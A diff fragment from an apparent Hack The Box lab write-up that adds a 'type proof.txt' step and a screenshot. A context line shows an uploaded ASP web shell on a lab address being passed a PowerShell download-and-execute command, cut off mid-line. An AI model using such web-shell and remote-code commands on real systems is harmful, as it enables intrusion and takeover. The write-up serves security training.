@@ -120,6 +120,11 @@ http://10.10.10.116/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclie
 ![image](https://user-images.githubusercontent.com/33616880/232365409-b30bd056-5ec7-4a2b-9540-6f0eb3417dd7.png)
 
 
+```
+type proof.txt
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/69164830-2b2e-4b58-bb1e-694899fd8dc9)
+
 
 ```
 whoami /priv
